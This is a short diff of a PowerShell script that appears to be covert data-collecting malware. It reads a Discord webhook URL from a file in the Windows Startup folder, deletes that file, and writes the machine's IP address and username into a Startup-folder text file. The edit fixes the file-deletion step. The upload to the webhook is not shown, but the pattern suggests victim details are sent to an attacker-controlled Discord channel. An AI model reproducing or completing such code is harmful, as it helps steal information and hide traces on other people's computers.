@@ -11,11 +11,11 @@ $UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+Spe
 $StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 # Define the path to the file containing the Discord webhook URL
-$DiscordWebhookURLFilePath = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL"
+$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL"
 # Use Get-Content to read the file and store its content in a variable
-$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFilePath
+$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 # # Delete the text file
-Remove-Item -Path $DiscordWebhookURL
+Remove-Item -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
 $TextContent = "$IPAddress`n$Username"
